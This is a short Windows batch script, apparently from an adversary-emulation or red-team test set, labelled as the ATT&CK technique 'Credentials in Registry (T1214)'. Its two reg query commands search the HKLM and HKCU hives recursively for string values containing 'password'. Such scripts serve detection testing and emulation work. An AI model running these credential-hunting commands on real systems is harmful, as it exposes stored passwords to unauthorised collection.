@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: Credentials in Registry (T1214)
ECHO.
ECHO [+] Quering Registries
ECHO -------------------------------------------------------------------
cmd /c reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
ECHO.


